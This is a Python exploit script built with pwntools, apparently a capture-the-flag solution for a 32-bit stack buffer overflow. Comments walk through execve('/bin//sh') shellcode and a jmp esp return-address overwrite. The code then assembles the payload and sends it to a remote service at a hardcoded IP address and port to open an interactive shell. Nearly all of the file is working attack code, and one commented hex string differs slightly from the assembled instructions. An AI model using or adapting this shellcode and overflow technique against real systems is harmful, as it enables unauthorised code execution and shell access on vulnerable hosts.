### VERY IMPORTANT PROCESS IN CONSTRUCTING THE SHELLCODE
# # shellcode <- unmodified -> 21 bytes
# 0:  6a 0b                   push   0xb # <-- push instruction to call execve
# 2:  58                      pop    rax # <-- sys call #11 rax is basically eax but 64 bits
# 3:  99                      cdq # <-- sign extend ax in the eax register
# 4:  31 c9                   xor    ecx,ecx <-- argv pointer?
# 6:  52                      push   rdx # <-- environment pointer
# 7:  68 2f 2f 73 68          push   0x68732f2f
# c:  68 2f 62 69 6e          push   0x6e69622f
# 11: 89 e3                   mov    ebx,esp
# 13: cd 80                   int    0x80


# jmp esp

# sub y value
# jmp esp again

# # shellcode final -> 
# xor ecx, ecx # 2 bytes
# xor edx, edx # 2 bytes
# push 0x68732f2f # 5 bytes
# push 0x6e69622f # 5 bytes
# mov ebx, esp # 2 bytes
# int 0x80 # 2 bytes

# # round 3 modification
# 0x0804919f # this is the jump esp instruction; it overwrites ret and occurs immediately after
# # leave; the leave instruction moves ebp back into esp, and then pops ebp (which also increments esp to the next instruction after ebp)
# push 0xb # 2 bytes <-- esp is now here after leave is executed
# pop rax # 1 byte
# cdq # 1 byte
# sub esp, 0x16 # 3 bytes <-- 0x16 because 18 bytes + 4 bytes (ret override) = 22 bytes 
# jmp esp # 2 bytes

from pwnlib.asm import *
from pwn import *

payload_part_1 = [
	'push 0x0b',
	'pop eax',
	'push ecx',
	'push 0x68732f2f',
	'push 0x6e69622f',
	'mov ebx, esp',
	'int 0x80'
]
payload_part_2 = [
	'xor ecx, ecx',
	'xor edx, edx',
	'sub esp, 0x16',
	'jmp esp'
]
# trying with strings
# \x31\xC9\x31\xD2\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x08\x6A\x0B\x58\x99\x83\xEC\x16\xFF\xE4
hexload1 = b''.join([asm(i, arch='i386') for i in payload_part_1])
hexload2 = b''.join([asm(i, arch='i386') for i in payload_part_2])
payload = hexload1 + p32(0x0804919f) + hexload2
print(payload, len(payload))

HOST = '167.71.143.20'
PORT = 31501


p = remote(HOST, PORT)
p.recvuntil("> ")
p.sendline(payload)
p.interactive()

with open('payload.hex', 'wb') as f:
	f.write(payload)
